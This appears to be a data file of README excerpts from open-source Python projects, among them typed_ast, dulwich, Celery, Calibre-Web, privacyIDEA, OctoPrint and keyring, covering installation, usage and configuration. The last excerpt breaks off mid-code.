Unlike `ast` up to Python 3.7, the parsers in\n`typed_ast` include [PEP 484](https://www.python.org/dev/peps/pep-0484/) type\ncomments and are independent of the version of Python under which they are run.\nThe `typed_ast` parsers produce the standard Python AST (plus type comments),\nand are both fast and correct, as they are based on the CPython 2.7 and 3.7\nparsers.  `typed_ast` runs on CPython 3.6-3.10 on Linux, OS X and Windows.\n\n**Note:** Starting with Python 3.8, we recommend to use the native `ast` parser\n(see below).\n\n## Development Philosophy\n\nThis project is a (mostly) drop-in replacement for the builtin `ast` module.  It is\nintended to be bug-for-bug compatible and behave identically, except for the\npresence of a few additional fields on the returned classes and a few\nadditional optional arguments to the `parse` call.  Therefore, `typed_ast` will\nnot accept any bugfixes for bugs in `ast` -- they should be fixed upstream\ninstead.  To avoid feature bloat, any new features for `typed_ast` should have\nthe potential to be broadly useful and not be built just for one niche usecase\nor in a manner such that only one project can use them.\n\n### Incompatibilities\n\nFor the purposes of *consuming* syntax trees, this should be a drop-in replacement.\nIt is not a drop-in replacement for users that wish to create or transform ASTs,\nas a number of syntax tree classes have additional fields that must be populated\nwhen constructing them.\n\nDue to reliance on certain C APIs, this library does not build on and there\nare [no plans to support PyPy](https://github.com/python/typed_ast/issues/111).\n\n### Python 3.8\n\n`typed_ast` will not be updated to support parsing Python 3.8 and\nnewer.  Instead, it is recommended to use the stdlib `ast` module\nthere, which has been augmented to support extracting type comments\nand has limited support for parsing older versions of Python 3.\n\n## Submodules\n### ast3\nThe `ast3` parser produces the AST from a Python 3 code, up to Python 3.7. \n(For rationale and technical\ndetails, see [here](update_process.md).)  The AST it currently produces is described in\n[ast3/Parser/Python.asdl](ast3/Parser/Python.asdl).  If you wish to limit\nparsing to older versions of Python 3, `ast3` can be configured to to give a\nSyntaxError for new syntax features introduced beyond a given Python version.\nFor more information, see the module docstring in\n[typed\\_ast/ast3.py](typed_ast/ast3.py).\n\n### ast27\nThe `ast27` parser tracks the standard Python 2.7 AST, which is expected to\nnever receive further updates. The AST it produces is described in\n[ast27/Parser/Python.asdl](ast27/Parser/Python.asdl).  For more information,\nsee the module docstring in [typed\\_ast/ast27.py](typed_ast/ast27.py).\n\n### conversions\n`typed_ast` also provides a `conversions` module which converts `ast27` ASTs\ninto `ast3` ASTs.  This functionality is somewhat experimental, however.  For\nmore information, see the `py2to3` docstring in\n[typed\\_ast/conversions](typed_ast/conversions.py).\n\n\nNote: as these parsers consider type comments part of the grammar, incorrectly\nplaced type comments are considered syntax errors.\n\n## Releases\n\nTo make a new `typed_ast` release, see [`release_process.md`](release_process.md).\n",

The reason for this is that they significantly improve the performance\nsince some low-level operations that are executed often are much slower in CPython.\n\nIf you don't want to install the Rust bindings, specify the --pure argument to setup.py::\n\n    $ python setup.py --pure install\n\nor if you are installing from pip::\n\n    $ pip install --no-binary dulwich dulwich --config-settings \"--build-option=--pure\"\n\nNote that you can also specify --build-option in a\n`requirements.txt <https://pip.pypa.io/en/stable/reference/requirement-specifiers/>`_\nfile, e.g. like this::\n\n    dulwich --config-settings \"--build-option=--pure\"\n\nGetting started\n---------------\n\nDulwich comes with both a lower-level API and higher-level plumbing (\"porcelain\").\n\nFor example, to use the lower level API to access the commit message of the\nlast commit::\n\n    >>> from dulwich.repo import Repo\n    >>> r = Repo('.')\n    >>> r.head()\n    '57fbe010446356833a6ad1600059d80b1e731e15'\n    >>> c = r[r.head()]\n    >>> c\n    <Commit 015fc1267258458901a94d228e39f0a378370466>\n    >>> c.message\n    'Add note about encoding.\\n'\n\nAnd to print it using porcelain::\n\n    >>> from dulwich import porcelain\n    >>> porcelain.log('.', max_entries=1)\n    --------------------------------------------------\n    commit: 57fbe010446356833a6ad1600059d80b1e731e15\n    Author: Jelmer Vernooĳ <jelmer@jelmer.uk>\n    Date:   Sat Apr 29 2017 23:57:34 +0000\n\n    Add note about encoding.\n\nFurther documentation\n---------------------\n\nThe dulwich documentation can be found in docs/ and built by running ``make\ndoc``. It can also be found `on the web <https://www.dulwich.io/docs/>`_.\n\nHelp\n----\n\nThere is a *#dulwich* IRC channel on the `OFTC <https://www.oftc.net/>`_, and\na `dulwich-discuss <https://groups.google.com/forum/#!forum/dulwich-discuss>`_\nmailing list.\n\nContributing\n------------\n\nFor a full list of contributors, see the git logs or `AUTHORS <AUTHORS>`_.\n\nIf you'd like to contribute to Dulwich, see the `CONTRIBUTING <CONTRIBUTING.rst>`_\nfile and `list of open issues <https://github.com/dulwich/dulwich/issues>`_.\n\nSupported versions of Python\n----------------------------\n\nAt the moment, Dulwich supports (and is tested on) CPython 3.6 and later and\nPypy.\n",

To initiate a task a client puts a\nmessage on the queue, the broker then delivers the message to a worker.\n\nA Celery system can consist of multiple workers and brokers, giving way\nto high availability and horizontal scaling.\n\nCelery is written in Python, but the protocol can be implemented in any\nlanguage. In addition to Python there's node-celery_ for Node.js,\na `PHP client`_, `gocelery`_, gopher-celery_ for Go, and rusty-celery_ for Rust.\n\nLanguage interoperability can also be achieved by using webhooks\nin such a way that the client enqueues an URL to be requested by a worker.\n\n.. _node-celery: https://github.com/mher/node-celery\n.. _`PHP client`: https://github.com/gjedeer/celery-php\n.. _`gocelery`: https://github.com/gocelery/gocelery\n.. _gopher-celery: https://github.com/marselester/gopher-celery\n.. _rusty-celery: https://github.com/rusty-celery/rusty-celery\n\nWhat do I need?\n===============\n\nCelery version 5.5.x runs on:\n\n- Python (3.8, 3.9, 3.10, 3.11, 3.12, 3.13)\n- PyPy3.9+ (v7.3.12+)\n\n\nThis is the version of celery which will support Python 3.8 or newer.\n\nIf you're running an older version of Python, you need to be running\nan older version of Celery:\n\n- Python 3.7: Celery 5.2 or earlier.\n- Python 3.6: Celery 5.1 or earlier.\n- Python 2.7: Celery 4.x series.\n- Python 2.6: Celery series 3.1 or earlier.\n- Python 2.5: Celery series 3.0 or earlier.\n- Python 2.4: Celery series 2.2 or earlier.\n\nCelery is a project with minimal funding,\nso we don't support Microsoft Windows but it should be working.\nPlease don't open any issues related to that platform.\n\n*Celery* is usually used with a message broker to send and receive messages.\nThe RabbitMQ, Redis transports are feature complete,\nbut there's also experimental support for a myriad of other solutions, including\nusing SQLite for local development.\n\n*Celery* can run on a single machine, on multiple machines, or even\nacross datacenters.\n\nGet Started\n===========\n\nIf this is the first time you're trying to use Celery, or you're\nnew to Celery v5.5.x coming from previous versions then you should read our\ngetting started tutorials:\n\n- `First steps with Celery`_\n\n    Tutorial teaching you the bare minimum needed to get started with Celery.\n\n- `Next steps`_\n\n    A more complete overview, showing more features.\n\n.. _`First steps with Celery`:\n    https://docs.celeryq.dev/en/stable/getting-started/first-steps-with-celery.html\n\n.. _`Next steps`:\n    https://docs.celeryq.dev/en/stable/getting-started/next-steps.html\n\n You can also get started with Celery by using a hosted broker transport CloudAMQP. The largest hosting provider of RabbitMQ is a proud sponsor of Celery.\n\nCelery is...\n=============\n\n- **Simple**\n\n    Celery is easy to use and maintain, and does *not need configuration files*.\n\n    It has an active, friendly community you can talk to for support,\n    like at our `mailing-list`_, or the IRC channel.\n\n    Here's one of the simplest applications you can make:\n\n    .. code-block:: python\n\n        from celery import Celery\n\n        app = Celery('hello', broker='amqp://guest@localhost//')\n\n        @app.task\n        def hello():\n            return 'hello world'\n\n- **Highly Available**\n\n    Workers and clients will automatically retry in the event\n    of connection loss or failure, and some brokers support\n    HA in way of *Primary/Primary* or *Primary/Replica* replication.\n\n- **Fast**\n\n    A single Celery process can process millions of tasks a minute,\n    with sub-millisecond round-trip latency (using RabbitMQ,\n    py-librabbitmq, and optimized settings).\n\n- **Flexible**\n\n    Almost every part of *Celery* can be extended or used on its own,\n    Custom pool implementations, serializers, compression schemes, logging,\n    schedulers, consumers, producers, broker transports, and much more.\n\nIt supports...\n================\n\n    - **Message Transports**\n\n        - RabbitMQ_, Redis_, Amazon SQS, Google Pub/Sub\n\n    - **Concurrency**\n\n        - Prefork, Eventlet_, gevent_, single threaded (``solo``)\n\n    - **Result Stores**\n\n        - AMQP, Redis\n        - memcached\n        - SQLAlchemy, Django ORM\n        - Apache Cassandra, IronCache, Elasticsearch\n        - Google Cloud Storage\n\n    - **Serialization**\n\n        - *pickle*, *json*, *yaml*, *msgpack*.\n        - *zlib*, *bzip2* compression.\n        - Cryptographic message signing.\n\n.. _`Eventlet`: http://eventlet.net/\n.. _`gevent`: http://gevent.org/\n\n.. _RabbitMQ: https://rabbitmq.com\n.. _Redis: https://redis.io\n.. _SQLAlchemy: http://sqlalchemy.org\n\nFramework Integration\n=====================\n\nCelery is easy to integrate with web frameworks, some of which even have\nintegration packages:\n\n    +--------------------+------------------------+\n    | `Django`_          | not needed             |\n    +--------------------+------------------------+\n    | `Pyramid`_         | `pyramid_celery`_      |\n    +--------------------+------------------------+\n    | `Pylons`_          | `celery-pylons`_       |\n    +--------------------+------------------------+\n    | `Flask`_           | not needed             |\n    +--------------------+------------------------+\n    | `web2py`_          | `web2py-celery`_       |\n    +--------------------+------------------------+\n    | `Tornado`_         | `tornado-celery`_      |\n    +--------------------+------------------------+\n    | `FastAPI`_         | not needed             |\n    +--------------------+------------------------+\n\nThe integration packages aren't strictly necessary, but they can make\ndevelopment easier, and sometimes they add important hooks like closing\ndatabase connections at ``fork``.\n\n.. _`Django`: https://djangoproject.com/\n.. _`Pylons`: http://pylonsproject.org/\n.. _`Flask`: https://flask.palletsprojects.com/\n.. _`web2py`: http://web2py.com/\n.. _`Bottle`: https://bottlepy.org/\n.. _`Pyramid`: https://docs.pylonsproject.org/projects/pyramid/en/latest/\n.. _`pyramid_celery`: https://pypi.org/project/pyramid_celery/\n.. _`celery-pylons`: https://pypi.org/project/celery-pylons/\n.. _`web2py-celery`: https://code.google.com/p/web2py-celery/\n.. _`Tornado`: https://www.tornadoweb.org/\n.. _`tornado-celery`: https://github.com/mher/tornado-celery/\n.. _`FastAPI`: https://fastapi.tiangolo.com/\n\n.. _celery-documentation:\n\nDocumentation\n=============\n\nThe `latest documentation`_ is hosted at Read The Docs, containing user guides,\ntutorials, and an API reference.\n\n.. _`latest documentation`: https://docs.celeryq.dev/en/latest/\n\n.. _celery-installation:\n\nInstallation\n============\n\nYou can install Celery either via the Python Package Index (PyPI)\nor from source.\n\nTo install using ``pip``:\n\n::\n\n\n    $ pip install -U Celery\n\n.. _bundles:\n\nBundles\n-------\n\nCelery also defines a group of bundles that can be used\nto install Celery and the dependencies for a given feature.\n\nYou can specify these in your requirements or on the ``pip``\ncommand-line by using brackets.

You can create a virtual environment by running:\n   ```\n   python3 -m venv calibre-web-env\n   ```\n2. **Activate the virtual environment**:\n   ```\n   source calibre-web-env/bin/activate\n   ```\n3. **Install Calibre-Web**: Use pip to install the application:\n   ```\n   pip install calibreweb\n   ```\n4. **Install optional features**: For additional functionality, you may need to install optional features. Refer to [this page](https://github.com/janeczku/calibre-web/wiki/Dependencies-in-Calibre-Web-Linux-and-Windows) for details on what can be installed.\n5. **Start Calibre-Web**: After installation, you can start the application with:\n   ```\n   cps\n   ```\n\n*Note: Users of Raspberry Pi OS may encounter installation issues. If you do, try upgrading pip and/or installing cargo as follows:*\n   ```\n   ./venv/bin/python3 -m pip install --upgrade pip\n   sudo apt install cargo\n   ```\n\n### Important Links\n- For additional installation examples, check the following:\n   - [Manual installation](https://github.com/janeczku/calibre-web/wiki/Manual-installation)\n   - [Linux Mint installation](https://github.com/janeczku/calibre-web/wiki/How-To:-Install-Calibre-Web-in-Linux-Mint-19-or-20)\n   - [Cloud Provider setup](https://github.com/janeczku/calibre-web/wiki/How-To:-Install-Calibre-Web-on-a-Cloud-Provider)\n\n## Quick Start\n\n1. **Access Calibre-Web**: Open your browser and navigate to:\n   ```\n   http://localhost:8083\n   ```\n   or for the OPDS catalog:\n   ```\n   http://localhost:8083/opds\n   ```\n2. **Log in**: Use the default admin credentials:\n   - **Username:** admin\n   - **Password:** admin123\n3. **Database Setup**: If you do not have a Calibre database, download a sample from:\n   ```\n   https://github.com/janeczku/calibre-web/raw/master/library/metadata.db\n   ```\n   Move it out of the Calibre-Web folder to avoid overwriting during updates.\n4. **Configure Calibre Database**: In the admin interface, set the `Location of Calibre database` to the path of the folder containing your Calibre library (where `metadata.db` is located) and click \"Save\".\n5. **Google Drive Integration**: For hosting your Calibre library on Google Drive, refer to the [Google Drive integration guide](https://github.com/janeczku/calibre-web/wiki/G-Drive-Setup#using-google-drive-integration).\n6. **Admin Configuration**: Configure your instance via the admin page, referring to the [Basic Configuration](https://github.com/janeczku/calibre-web/wiki/Configuration#basic-configuration) and [UI Configuration](https://github.com/janeczku/calibre-web/wiki/Configuration#ui-configuration) guides.\n\n## Requirements\n\n- **Python Version**: Ensure you have Python 3.7 or newer.\n- **Imagemagick**: Required for cover extraction from EPUBs. Windows users may also need to install [Ghostscript](https://ghostscript.com/releases/gsdnld.html) for PDF cover extraction.\n- **Windows Users**: Install [libmagic](https://gnuwin32.sourceforge.net/downlinks/file.php) for 32bit python or [libmagic for 64bit python](https://github.com/nscaife/file-windows/releases/tag/20170108), depending on your Python version. Make sure these files are included in your path.\n- **Optional Tools**:\n   - **Calibre desktop program**: Recommended for on-the-fly conversion and metadata editing. Set the path to Calibre’s converter tool on the setup page.\n   - **Kepubify tool**: Needed for Kobo device support. Download the tool and place the binary in `/opt/kepubify` on Linux or `C:\\Program Files\\kepubify` on Windows.\n\n## Docker Images\n\nPre-built Docker images are available:\n\n### **LinuxServer - x64, aarch64**\n- **Docker Hub**: [linuxserver/calibre-web](https://hub.docker.com/r/linuxserver/calibre-web)\n- **GitHub**: [linuxserver/docker-calibre-web](https://github.com/linuxserver/docker-calibre-web)\n- **Optional Calibre layer**: [linuxserver/docker-mods](https://github.com/linuxserver/docker-mods/tree/universal-calibre)\n\nTo include the Calibre `ebook-convert` binary (x64 only), add the environment variable:\n``` \nDOCKER_MODS=linuxserver/mods:universal-calibre\n```\nin your Docker run/compose file. Omit this variable for a lightweight image.\n\n- **Paths Configuration**:\n   - Set **Path to Calibre Binaries** to `/usr/bin`.\n   - Set **Path to Unrar** to `/usr/bin/unrar`.\n\n## Troubleshooting\n\n- **Common Issues**: \n   - If you experience issues starting the application, check the log files located in the `logs` directory for error messages.\n   - If eBooks fail to load, verify that the `Location of Calibre database` is correctly set and that the database file is accessible.\n\n- **Configuration Errors**: Ensure that your Calibre database is compatible and properly formatted. Refer to the Calibre documentation for guidance on maintaining the database.\n\n- **Performance Problems**: \n   - If the application is slow, consider increasing the allocated resources (CPU/RAM) to your server or optimizing the Calibre database by removing duplicates and unnecessary entries.\n   - Regularly clear the cache in your web browser to improve loading times.\n\n- **User Management Issues**: If users are unable to log in or register, check the user permission settings in the admin interface. Ensure that registration is enabled and that users are being assigned appropriate roles.\n\n- **Support Resources**: For additional help, consider visiting the [FAQ section](https://github.com/janeczku/calibre-web/wiki/FAQ) of the wiki or posting your questions in the [Discord community](https://discord.gg/h2VsJ2NEfB).\n\n## Contributor Recognition\n\nWe would like to thank all the [contributors](https://github.com/janeczku/calibre-web/graphs/contributors) and maintainers of Calibre-Web for their valuable input and dedication to the project.

Thus boosting the security of your\nexisting applications.\n\nOverview\n========\n\nprivacyIDEA runs as an additional service in your network and you can connect different\napplications to privacyIDEA.\n\n.. image:: https://privacyidea.org/wp-content/uploads/2017/privacyIDEA-Integration.png\n    :alt: privacyIDEA Integration\n\nprivacyIDEA does not bind you to any decision of the authentication\nprotocol, nor does it dictate you where your user information should be\nstored. This is achieved by its totally modular architecture.\nprivacyIDEA is not only open as far as its modular architecture is\nconcerned. But privacyIDEA is completely licensed under the AGPLv3.\n\nIt supports a wide variety of authentication devices like OTP tokens\n(HMAC, HOTP, TOTP, OCRA, mOTP), Yubikey (HOTP, TOTP, AES), FIDO U2F, as well\nas FIDO2 WebAuthn devices like Yubikey and Plug-Up, smartphone Apps like Google\nAuthenticator, FreeOTP, Token2  or TiQR, SMS, Email, SSH keys, x509 certificates\nand Registration Codes for easy deployment.\n\nprivacyIDEA is based on Flask and SQLAlchemy as the python backend. The\nweb UI is based on angularJS and bootstrap.\nA MachineToken design lets you assign tokens to machines. Thus you can use\nyour Yubikey to unlock LUKS, assign SSH keys to SSH servers or use Offline OTP\nwith PAM.\n\nYou may join the discourse discussion forum to give feedback, help other users,\ndiscuss questions and ideas:\nhttps://community.privacyidea.org\n\n\nSetup\n=====\n\nFor setting up the system to *run* it, please read install instructions\nat `privacyidea.readthedocs.io <http://privacyidea.readthedocs.io/en/latest/installation/index\n.html>`_.\n\nIf you want to setup a development environment start like this::\n\n    git clone https://github.com/privacyidea/privacyidea.git\n    cd privacyidea\n    virtualenv venv\n    source venv/bin/activate\n    pip install -r requirements.txt\n\n.. _testing_env:\n\nYou may additionally want to set up your environment for testing, by adding the\nadditional dependencies::\n\n    pip install -r tests/requirements.txt\n\nYou may also want to read the blog post about development and debugging at\nhttps://www.privacyidea.org/privacyidea-development-howto/\n\nGetting and updating submodules\n===============================\n\nThe client-side library for the registering and signing of WebAuthn-Credentials\nresides in a submodule.\n\nTo fetch all submodules for this repository, run::\n\n   git submodule update --init --recursive\n\nWhen pulling changes from upstream later, you can automatically update any outdated\nsubmodules, by running::\n\n   git pull --recurse-submodules\n\nRunning it\n==========\n\nFirst You need to create a `config-file <https://privacyidea.readthedocs\n.io/en/latest/installation/system/inifile.html>`_.\n\nThen create the database tables and the encryption key::\n\n    ./pi-manage create_tables\n    ./pi-manage create_enckey\n\nIf You want to keep the development database upgradable, You should `stamp\n<https://privacyidea.readthedocs.io/en/latest/installation/upgrade.html>`_ it\nto simplify updates::\n\n    ./pi-manage db stamp head -d migrations/\n\nCreate the key for the audit log::\n\n    ./pi-manage create_audit_keys\n\nCreate the first administrator::\n\n    ./pi-manage admin add <username>\n\nRun it::\n\n    ./pi-manage run\n\nNow you can connect to http://localhost:5000 with your browser and login\nas administrator.\n\nRun tests\n=========\n\nIf you have followed the steps above to set up your\n`environment for testing <#testing-env>`__, running the test suite should be as\neasy as running `pytest <http://pytest.org/>`_ with the following options::\n\n    python -m pytest -v --cov=privacyidea --cov-report=html tests/\n\nContributing\n============\n\nThere are a lot of different ways to contribute to privacyIDEA, even\nif you are not a developer.\n\nIf you found a security vulnerability please report it to\nsecurity@privacyidea.org.\n\nYou can find detailed information about contributing here:\nhttps://github.com/privacyidea/privacyidea/blob/master/CONTRIBUTING.md\n\nCode structure\n==============\n\nThe database models are defined in ``models.py`` and tested in\ntests/test_db_model.py.\n\nBased on the database models there are the libraries ``lib/config.py`` which is\nresponsible for basic configuration in the database table ``config``.\nAnd the library ``lib/resolver.py`` which provides functions for the database\ntable ``resolver``. This is tested in tests/test_lib_resolver.py.\n\nBased on the resolver there is the library ``lib/realm.py`` which provides\nfunctions\nfor the database table ``realm``. Several resolvers are combined into a realm.\n\nBased on the realm there is the library ``lib/user.py`` which provides functions\nfor users. There is no database table user, since users are dynamically read\nfrom the user sources like SQL, LDAP, SCIM or flat files.\n\nSubscriptions and limitations of community edition\n==================================================\n\nUsing privacyIDEA Server and the privacyIDEA FreeRADIUS plugin there is technically no\nlimitation of the community edition or the code in this repository.\nAdmins will receive a welcome message about possible support, if more than 50 users\nare enrolled.\n\nPlugins\n-------\n\nThe privacyIDEA project also provides several plugins for 3rd party applications like SSO Identity Providers\nor Windows Login.\n\nPlugins can be limited in the number of users. I.e. the plugin will complain, if the total number of users\nin privacyIDEA with an active token exceeds a certain limit. There is a certain base number of users, with which\nthe plugin will work. To enhance this number, you will need a subscription. In some cases an additional\ndemo subscription can be found in the release list of the corresponding github plugin repository,\nyou can get a subscription from the company NetKnights\nor if you have a very good understanding of this Open Source code, you could create a subscription on your own.\n\n====================  ==============  ========================\nPlugin                Number of users\n--------------------  ----------------------------------------\nName                  contained       in demo subscription\n====================  ==============  ========================\nKeycloak              10000           N/A\nSimpleSAMLphp         10000           N/A\nShibboleth            10000           N/A\nADFS                  50              50\nprivacyIDEA PAM       10000           N/A\nCredential Provider   50              50\nownCloud              50              N/A\nLDAP proxy            50              N/A\n====================  ==============  ========================\n\nVersioning\n==========\nprivacyIDEA adheres to `Semantic Versioning <http://semver.org/>`_.\n",

If you already installed it\n(e.g. by using the Raspberry Pi targeted distribution [OctoPi](https://github.com/guysoft/OctoPi)) and only\nwant to find out how to use it, [the documentation](https://docs.octoprint.org/) might be of more interest for you.

Create a user-owned virtual environment therein: `virtualenv venv`. If you want to specify a specific python\n   to use instead of whatever version your system defaults to, you can also explicitly require that via the `--python`\n   parameter, e.g. `virtualenv --python=python3 venv`.\n2. Install OctoPrint *into that virtual environment*: `./venv/bin/pip install OctoPrint`\n\nYou may then start the OctoPrint server via `/path/to/OctoPrint/venv/bin/octoprint`, see [Usage](#usage)\nfor details.\n\nAfter installation, please make sure you follow the first-run wizard and set up\naccess control as necessary.\n\n## Dependencies\n\nOctoPrint depends on a few python modules to do its job. Those are automatically installed when installing\nOctoPrint via `pip`.\n\nOctoPrint currently supports Python 3.7, 3.8, 3.9, 3.10, 3.11 and 3.12.\n\n## Usage\n\nRunning the pip install via\n\n    pip install OctoPrint\n\ninstalls the `octoprint` script in your Python installation's scripts folder\n(which, depending on whether you installed OctoPrint globally or into a virtual env, will be in your `PATH` or not). The\nfollowing usage examples assume that the `octoprint` script is on your `PATH`.\n\nYou can start the server via\n\n    octoprint serve\n\nBy default it binds to all interfaces on port 5000 (so pointing your browser to `http://127.0.0.1:5000`\nwill do the trick). If you want to change that, use the additional command line parameters `host` and `port`,\nwhich accept the host ip to bind to and the numeric port number respectively. If for example you want the server\nto only listen on the local interface on port 8080, the command line would be\n\n    octoprint serve --host=127.0.0.1 --port=8080\n\nAlternatively, the host and port on which to bind can be defined via the config file.\n\nIf you want to run OctoPrint as a daemon (only supported on Linux), use\n\n    octoprint daemon {start|stop|restart} [--pid PIDFILE]\n\nIf you do not supply a custom pidfile location via `--pid PIDFILE`, it will be created at `/tmp/octoprint.pid`.\n\nYou can also specify the config file or the base directory (for basing off the `uploads`, `timelapse` and `logs` folders),\ne.g.:\n\n    octoprint serve --config /path/to/another/config.yaml --basedir /path/to/my/basedir\n\nTo start OctoPrint in safe mode - which disables all third party plugins that do not come bundled with OctoPrint - use\nthe ``--safe`` flag:\n\n    octoprint serve --safe\n\nSee `octoprint --help` for more information on the available command line parameters.\n\nOctoPrint also ships with a `run` script in its source directory. You can invoke it to start the server. It\ntakes the same command line arguments as the `octoprint` script.\n\n## Configuration\n\nIf not specified via the command line, the config file `config.yaml` for OctoPrint is expected in the settings folder,\nwhich is located at `~/.octoprint` on Linux, at `%APPDATA%/OctoPrint` on Windows and\nat `~/Library/Application Support/OctoPrint` on MacOS.\n\nA comprehensive overview of all available configuration settings can be found\n[in the docs](https://docs.octoprint.org/en/master/configuration/config_yaml.html).\nPlease note that the most commonly used configuration settings can also easily\nbe edited from OctoPrint's settings dialog.\n\n## Special Thanks\n\nCross-browser testing services are kindly provided by [BrowserStack](https://www.browserstack.com/).\n\nProfiling is done with the help of [PyVmMonitor](https://www.pyvmmonitor.com).\n\nError tracking is powered and sponsored by [Sentry](https://sentry.io).\n",

It can be used in any\napplication that needs safe password storage.\n\nThese recommended keyring backends are supported:\n\n* macOS `Keychain\n  <https://en.wikipedia.org/wiki/Keychain_%28software%29>`_\n* Freedesktop `Secret Service\n  <http://standards.freedesktop.org/secret-service/>`_ supports many DE including\n  GNOME (requires `secretstorage <https://pypi.python.org/pypi/secretstorage>`_)\n* KDE4 & KDE5 `KWallet <https://en.wikipedia.org/wiki/KWallet>`_\n  (requires `dbus <https://pypi.python.org/pypi/dbus-python>`_)\n* `Windows Credential Locker\n  <https://docs.microsoft.com/en-us/windows/uwp/security/credential-locker>`_\n\nOther keyring implementations are available through `Third-Party Backends`_.\n\nInstallation - Linux\n====================\n\nOn Linux, the KWallet backend relies on dbus-python_, which does not always\ninstall correctly when using pip (compilation is needed). For best results,\ninstall dbus-python as a system package.\n\n.. _dbus-python: https://gitlab.freedesktop.org/dbus/dbus-python\n\nCompatibility - macOS\n=====================\n\nmacOS keychain supports macOS 11 (Big Sur) and later requires Python 3.8.7\nor later with the \"universal2\" binary. See\n`#525 <https://github.com/jaraco/keyring/issues/525>`_ for details.\n\nUsing Keyring\n=============\n\nThe basic usage of keyring is pretty simple: just call\n``keyring.set_password`` and ``keyring.get_password``::\n\n    >>> import keyring\n    >>> keyring.set_password(\"system\", \"username\", \"password\")\n    >>> keyring.get_password(\"system\", \"username\")\n    'password'\n\nCommand-line Utility\n--------------------\n\nKeyring supplies a ``keyring`` command which is installed with the\npackage. After installing keyring in most environments, the\ncommand should be available for setting, getting, and deleting\npasswords. For more usage information, invoke with no arguments\nor with ``--help`` as so::\n\n    $ keyring --help\n    $ keyring set system username\n    Password for 'username' in 'system':\n    $ keyring get system username\n    password\n\nThe command-line functionality is also exposed as an executable\npackage, suitable for invoking from Python like so::\n\n    $ python -m keyring --help\n    $ python -m keyring set system username\n    Password for 'username' in 'system':\n    $ python -m keyring get system username\n    password\n\nTab Completion\n--------------\n\nIf installed via a package manager (apt, pacman, nix, homebrew, etc),\nthese shell completions may already have been distributed with the package\n(no action required).\n\nKeyring provides tab completion if the ``completion`` extra is installed::\n\n    $ pip install 'keyring[completion]'\n\nThen, generate shell completions, something like::\n\n    $ keyring --print-completion bash | sudo tee /usr/share/bash-completion/completions/keyring\n    $ keyring --print-completion zsh | sudo tee /usr/share/zsh/site-functions/_keyring\n    $ keyring --print-completion tcsh | sudo tee /etc/profile.d/keyring.csh\n\n**Note**: the path of `/usr/share` is mainly for GNU/Linux. For other OSs,\nconsider:\n\n- macOS (Homebrew x86): /usr/local/share\n- macOS (Homebrew ARM): /opt/homebrew/share\n- Android (Termux): /data/data/com.termux/files/usr/share\n- Windows (mingw64 of msys2): /mingw64/share\n- ...\n\nAfter installing the shell completions, enable them following your shell's\nrecommended instructions. e.g.:\n\n- bash: install `bash-completion <https://github.com/scop/bash-completion>`_,\n  and ensure ``. /usr/share/bash-completion/bash_completion`` in ``~/.bashrc``.\n- zsh: ensure ``autoload -Uz compinit && compinit`` appears in ``~/.zshrc``,\n  then ``grep -w keyring ~/.zcompdump`` to verify keyring appears, indicating\n  it was installed correctly.\n\nConfiguring\n===========\n\nThe python keyring lib contains implementations for several backends. The\nlibrary will attempt to\nautomatically choose the most suitable backend for the current\nenvironment. Users may also specify the preferred keyring in a\nconfig file or by calling the ``set_keyring()`` function.\n\nConfig file path\n----------------\n\nThe configuration is stored in a file named \"keyringrc.cfg\"\nfound in a platform-specific location. To determine\nwhere the config file is stored, run ``keyring diagnose``.\n\nConfig file content\n-------------------\n\nTo specify a keyring backend, set the **default-keyring** option to the\nfull path of the class for that backend, such as\n``keyring.backends.macOS.Keyring``.\n\nIf **keyring-path** is indicated, keyring will add that path to the Python\nmodule search path before loading the backend.\n\nFor example, this config might be used to load the\n``SimpleKeyring`` from the ``simplekeyring`` module in\nthe ``./demo`` directory (not implemented)::\n\n    [backend]\n    default-keyring=simplekeyring.SimpleKeyring\n    keyring-path=demo\n\nThird-Party Backends\n====================\n\nIn addition to the backends provided by the core keyring package for\nthe most common and secure use cases, there\nare additional keyring backend implementations available for other\nuse cases. Simply install them to make them available:\n\n- `keyrings.cryptfile <https://pypi.org/project/keyrings.cryptfile>`_\n  - Encrypted text file storage.\n- `keyrings.alt <https://pypi.org/project/keyrings.alt>`_ - \"alternate\",\n  possibly-insecure backends, originally part of the core package, but\n  available for opt-in.\n- `gsheet-keyring <https://pypi.org/project/gsheet-keyring>`_\n  - a backend that stores secrets in a Google Sheet. For use with\n  `ipython-secrets <https://pypi.org/project/ipython-secrets>`_.\n- `bitwarden-keyring <https://pypi.org/project/bitwarden-keyring/>`_\n  - a backend that stores secrets in the `BitWarden <https://bitwarden.com/>`_\n  password manager.\n- `onepassword-keyring <https://pypi.org/project/onepassword-keyring/>`_\n  - a backend that stores secrets in the `1Password <https://1password.com/>`_ password manager.\n- `sagecipher <https://pypi.org/project/sagecipher>`_ - an encryption\n  backend which uses the ssh agent protocol's signature operation to\n  derive the cipher key.\n- `keyrings.osx_keychain_keys <https://pypi.org/project/keyrings.osx-keychain-keys>`_\n  - OSX keychain key-management, for private, public, and symmetric keys.\n- `keyring_pass.PasswordStoreBackend <https://github.com/nazarewk/keyring_pass>`_\n   - Password Store (pass) backend for python's keyring \n- `keyring_jeepney <https://pypi.org/project/keyring_jeepney>`__ - a\n  pure Python backend using the secret service DBus API for desktop\n  Linux (requires ``keyring<24``).\n\n\nWrite your own keyring backend\n==============================\n\nThe interface for the backend is defined by ``keyring.backend.KeyringBackend``.\nEvery backend should derive from that base class and define a ``priority``\nattribute and three functions: ``get_password()``, ``set_password()``, and\n``delete_password()``. The ``get_credential()`` function may be defined if\ndesired.\n\nSee the ``backend`` module for more detail on the interface of this class.\n\nKeyring employs entry points to allow any third-party package to implement\nbackends without any modification to the keyring itself. Those interested in\ncreating new backends are encouraged to create new, third-party packages\nin the ``keyrings`` namespace, in a manner modeled by the `keyrings.alt\npackage <https://github.com/jaraco/keyrings.alt>`_. See the\n``setup.cfg`` file\nin that project for hints on how to create the requisite entry points.\nBackends that prove essential may be considered for inclusion in the core\nlibrary, although the ease of installing these third-party packages should\nmean that extensions may be readily available.\n\nTo create an extension for Keyring, please submit a pull request to\nhave your extension mentioned as an available extension.\n\nRuntime Configuration\n=====================\n\nKeyring additionally allows programmatic configuration of the\nbackend calling the api ``set_keyring()``. The indicated backend\nwill subsequently be used to store and retrieve passwords.\n\nTo invoke ``set_keyring``::\n\n    # define a new keyring class which extends the KeyringBackend\n    import keyring.backend\n\n    class TestKeyring(keyring.backend.KeyringBackend):\n        \"\"\"A test keyring which always outputs the same password\n        \"\"\"\n        priority = 1\n\n        def set_password(self, servicename, username, password):\n            pass\n\n        def get_password(self, servicename, username):\n            return \"password from 